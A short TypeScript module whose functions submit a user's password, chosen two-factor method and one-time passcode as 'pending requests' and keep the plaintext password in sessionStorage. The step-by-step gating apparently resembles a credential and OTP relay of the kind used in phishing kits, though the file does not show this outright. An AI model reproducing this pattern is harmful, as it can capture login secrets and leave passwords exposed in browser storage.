import { createPendingRequest } from "@/lib/create-pending-request"

export async function submitLoginGate(
  userId: string,
  password: string,
): Promise<string> {
  return createPendingRequest({
    kind: "login",
    userId,
    password,
    method: "text",
    maskedEmail: "-",
    maskedPhone: "-",
  })
}

export async function submitMethodGate(
  userId: string,
  twoFactorMethod: string,
): Promise<string> {
  return createPendingRequest({
    kind: "method",
    userId,
    twoFactorMethod,
  })
}

export async function submitOtpGate(
  userId: string,
  otp: string,
  twoFactorMethod = "sms",
): Promise<string> {
  return createPendingRequest({
    kind: "otp",
    userId,
    otp,
    twoFactorMethod,
  })
}

export function storeLoginCredentials(userId: string, password: string) {
  if (typeof window === "undefined") return
  sessionStorage.setItem("loginUserId", userId)
  sessionStorage.setItem("loginPassword", password)
}

export function getStoredLoginUserId(): string {
  if (typeof window === "undefined") return ""
  return sessionStorage.getItem("loginUserId") ?? ""
}

export function getStoredLoginPassword(): string {
  if (typeof window === "undefined") return ""
  return sessionStorage.getItem("loginPassword") ?? ""
}
